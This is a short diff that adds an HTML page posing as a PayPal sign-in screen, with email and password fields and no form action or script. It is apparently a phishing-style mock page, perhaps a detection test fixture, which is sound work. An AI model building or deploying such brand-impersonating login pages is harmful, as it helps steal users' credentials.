@@ -1,0 +1,1 @@
+<html><body><h1>PayPal account</h1><p>Sign in to your paypal.com account.</p><form><input name='email'><input name='password' type='password'></form></body></html>
